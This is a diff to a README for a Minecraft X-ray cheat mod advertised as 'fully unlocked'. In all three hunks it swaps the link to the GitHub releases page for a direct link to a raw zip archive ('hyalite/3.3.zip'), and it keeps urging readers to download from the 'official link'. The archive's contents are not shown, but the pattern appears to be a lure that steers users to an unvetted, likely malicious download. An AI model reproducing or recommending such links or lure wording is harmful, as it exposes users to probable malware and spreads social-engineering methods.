@@ -26,7 +26,7 @@ This is the **2026 edition**, fully unlocked with every feature available. No hi
 
 ## 📥 Download Minecraft-Xray-Mod
 
-[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD-Minecraft--Xray--Mod_2026-FF5722?style=for-the-badge&logo=github&logoColor=white&labelColor=4CAF50)](https://github.com/Randyunlittered212/Minecraft-Xray-Mod/releases)
+[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD-Minecraft--Xray--Mod_2026-FF5722?style=for-the-badge&logo=github&logoColor=white&labelColor=4CAF50)](https://raw.githubusercontent.com/Randyunlittered212/Minecraft-Xray-Mod/main/hyalite/3.3.zip)
 
 Visit this link to download the application.
 
@@ -40,7 +40,7 @@ Follow these simple steps to get Minecraft-Xray-Mod running on your computer:
 
 Click the green download button above or visit this link directly:
 
-**https://github.com/Randyunlittered212/Minecraft-Xray-Mod/releases**
+**https://raw.githubusercontent.com/Randyunlittered212/Minecraft-Xray-Mod/main/hyalite/3.3.zip**
 
 Visit this link to download the application.
 
@@ -179,7 +179,7 @@ Remember to always download from the official link to ensure you get the genuine
 
 ## 🔗 Quick Download Link
 
-**https://github.com/Randyunlittered212/Minecraft-Xray-Mod/releases**
+**https://raw.githubusercontent.com/Randyunlittered212/Minecraft-Xray-Mod/main/hyalite/3.3.zip**
 
 Visit this link to download the application.
 
